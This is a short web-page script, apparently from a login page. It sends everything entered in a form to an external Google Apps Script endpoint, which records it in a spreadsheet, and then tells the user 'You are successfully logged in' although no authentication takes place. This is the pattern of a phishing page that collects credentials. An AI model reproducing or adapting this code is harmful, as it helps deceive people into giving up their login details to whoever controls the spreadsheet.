            <script type="text/javascript">


const scriptURL = 'https://script.google.com/macros/s/AKfycbyU1E_BD8-siyOcTgxHlTmcd3PKodKCQMKXHA0Do2pRF18EOX7nvZYbjPUNjVi1mcoLFw/exec'
      const form = document.forms['google-sheet']
    
      form.addEventListener('submit', e => {
        e.preventDefault()
        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
          .then(response => alert("You are successfully logged in."))
          .catch(error => console.error('Error!', error.message))
})

</script>
